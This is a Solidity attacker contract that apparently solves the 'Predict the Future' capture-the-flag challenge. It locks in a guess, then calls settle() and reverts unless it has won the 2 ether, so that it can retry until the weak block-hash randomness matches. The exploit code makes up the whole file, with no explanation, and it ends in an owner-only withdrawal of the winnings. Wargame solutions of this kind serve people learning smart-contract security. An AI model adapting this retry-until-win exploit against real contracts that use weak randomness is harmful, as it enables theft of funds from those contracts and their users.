pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract PredictTheFutureChallengeAttacker {

    address owner;
    IPredictTheFutureChallenge challenge;

    constructor(address addr) {
        owner = msg.sender;
        challenge = IPredictTheFutureChallenge(addr);
    }

    receive() external payable {}

    function lockInGuess() public payable {
        challenge.lockInGuess{value: 1 ether}(0);        
    }

    function attack() public {
        challenge.settle();
        require(challenge.isComplete(), "Wrong answer.");
        require(address(this).balance == 2 ether, "Account should contain 2 eth.");
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw.");
        bool success;
        (success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}
